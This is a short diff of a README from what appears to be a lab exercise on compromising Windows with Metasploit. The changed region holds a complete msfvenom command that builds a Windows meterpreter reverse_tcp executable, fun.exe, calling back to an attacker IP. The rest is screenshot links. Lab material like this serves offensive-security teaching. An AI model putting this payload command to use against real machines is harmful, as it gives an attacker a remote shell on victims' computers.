@@ -28,6 +28,8 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 
 ![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/0dd3d067-aba5-458c-9ae0-dc8287c7228e)
+
+
 Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
 
 ![image](https://github.com/kavisree86/Compromising-windows-using-Metasploit/assets/145759687/d3ccdc73-0cf7-4c28-859f-30d6912bc614)
